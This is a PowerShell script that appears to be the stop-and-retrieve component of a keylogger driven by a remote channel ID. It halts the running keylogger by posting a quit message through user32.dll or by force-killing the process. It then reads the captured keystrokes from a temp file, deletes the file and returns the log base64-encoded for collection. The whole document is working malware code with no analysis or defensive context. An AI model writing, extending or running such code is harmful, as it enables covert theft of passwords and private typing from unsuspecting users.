param($args)

$channelID = $env:ChannelID
$logFile = "$env:TEMP\keylog_$channelID.txt"
$jobFile = "$env:TEMP\keylog_job_$channelID.txt"

# Try to stop the keylogger gracefully
if (Test-Path $jobFile) {
    $pidRunning = Get-Content $jobFile
    try {
        # Signal the keylogger to stop (requires Keylogger.Stop method)
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Stopper {
    [DllImport("user32.dll")]
    public static extern bool PostThreadMessage(uint threadId, uint msg, IntPtr wParam, IntPtr lParam);
    const uint WM_QUIT = 0x0012;
    public static void QuitThread(uint threadId) {
        PostThreadMessage(threadId, WM_QUIT, IntPtr.Zero, IntPtr.Zero);
    }
}
"@ -ReferencedAssemblies "System.Windows.Forms"
        [Stopper]::QuitThread($pidRunning)
        Start-Sleep -Seconds 1
    } catch {
        # If that fails, kill the process
        Stop-Process -Id $pidRunning -Force -ErrorAction SilentlyContinue
    }
    Remove-Item $jobFile -Force
}

if (Test-Path $logFile) {
    $content = Get-Content $logFile -Raw
    Remove-Item $logFile -Force
    if ($content) {
        # Return log as base64
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($content)
        [System.Convert]::ToBase64String($bytes)
    } else {
        "No keystrokes recorded."
    }
} else {
    "Keylogger not running."
}